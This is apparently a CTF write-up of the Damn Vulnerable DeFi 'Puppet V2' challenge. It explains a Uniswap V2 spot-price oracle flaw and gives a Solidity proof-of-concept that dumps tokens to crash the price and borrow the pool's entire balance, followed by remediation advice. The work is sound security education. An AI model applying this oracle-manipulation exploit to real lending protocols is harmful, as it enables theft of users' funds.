---
title: 'Damn Vulnerable DeFi - Puppet V2'
description: 'Evolution of price manipulation on Uniswap V2. Learn how blindly trusting official libraries and increasing collateral requirements still fails if the underlying price oracle remains manipulative.'
date: 2025-07-09
tags: ['solidity', 'security', 'oracle', 'price-manipulation', 'uniswap-v2', 'audit', 'damn-vulnerable-defi','ctf']
image: '../../../../public/damn-vulnerable-defi.png'
authors: ['thesandf']
---

# 🎭 Puppet V2 - The Library Trust Trap

## Challenge Overview

`Puppet V2` is an iterative improvement over V1. The developers swapped Uniswap V1 for **Uniswap V2** and used the official `UniswapV2Library` for price calculations. They also increased the collateral requirement to **3x the value** and switched to requiring **WETH** as collateral instead of raw ETH.

**Starting State:**
*   Lending Pool: 1,000,000 DVT.
*   Uniswap V2 Pair: Low liquidity.
*   Player: 20 ETH + 10,000 DVT.

**The Goal:** Drain the entire 1,000,000 DVT and transfer it to the recovery account.

---

## Technical Analysis

### The Vulnerable Code: The "Official" yet Flawed Oracle

The contract uses the standard `UniswapV2Library` to get reserves and calculate quotes:

```solidity
function _getOracleQuote(uint256 amount) private view returns (uint256) {
    (uint256 reservesWETH, uint256 reservesToken) =
        UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

    return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
}
```

### The Root Cause: Spot Price Manipulation (Still)

Just like in V1, the price is derived from the **current** reserves of a Uniswap pair. 

1.  **Library vs. Logic:** While `UniswapV2Library` is safe in its math, it doesn't solve the fundamental issue of **spot price manipulation**. 
2.  **Instantaneous Data:** `getReserves` returns the reserves *at the moment of execution*. In a shallow pool, an attacker can shift the reserves drastically in a single trade.
3.  **Collateral Bypass:** By dumping DVT into the pool, the attacker makes DVT extremely cheap. The 3x WETH collateral requirement becomes negligible because the "value" of DVT is now near zero according to the oracle.

---

## The Exploit: The Second Market Dump

1.  **Convert to WETH:** Deposit our 20 ETH into the WETH contract.
2.  **Dump DVT:** Sell all 10,000 DVT into the Uniswap V2 pair. This crashes the DVT price significantly.
3.  **Borrow Cheaply:** Calculate the required WETH collateral for 1,000,000 DVT using the crashed price. Since the price is near zero, our remaining WETH is more than enough.
4.  **Transfer:** Move the 1,000,000 DVT to the recovery address.

---

## Proof of Concept (PoC)

```solidity
function test_puppetV2() public checkSolvedByPlayer {
    // 1. Convert player ETH to WETH
    weth.deposit{value: player.balance}();

    // 2. Dump 10,000 DVT into Uniswap V2
    token.approve(address(uniswapV2Router), type(uint256).max);
    address[] memory path = new address[](2);
    path[0] = address(token);
    path[1] = address(weth);

    uniswapV2Router.swapExactTokensForTokens(
        PLAYER_INITIAL_TOKEN_BALANCE,
        1,
        path,
        player,
        block.timestamp + 1000
    );

    // 3. Borrow everything with manipulated low price
    weth.approve(address(lendingPool), type(uint256).max);
    uint256 borrowAmount = POOL_INITIAL_TOKEN_BALANCE;
    lendingPool.borrow(borrowAmount);

    // 4. Send to recovery
    token.transfer(recovery, borrowAmount);
}
```

---

## Auditor's Lessons

1.  **Version Upgrades Aren't Magic Fixes:** Upgrading from V1 to V2 or using official libraries only helps if you fix the underlying architectural flaw (spot price reliance).
2.  **TWAP is Non-Negotiable:** For any lending or liquidation logic, you **must** use an oracle that is resistant to manipulation, like Uniswap's Time-Weighted Average Price (TWAP).
3.  **Collateral Multipliers Aren't Security:** Increasing a collateral factor from 2x to 3x is useless if the price source can be manipulated by 100x.
4.  **Assume Flash Loans and Whales:** Always design your system assuming someone has enough capital to move your AMM pools to their limits in a single block.

---

## Remediation

*   **Implement Uniswap V2 TWAP:** Instead of `getReserves`, use the `price0CumulativeLast` and `price1CumulativeLast` values to compute an average price over multiple blocks.
*   **Decentralized Oracle Aggregation:** Use Chainlink to provide a secondary "sanity check" price.
*   **Liquidity Thresholds:** Refuse to provide loans if the AMM pool liquidity is below a certain depth.
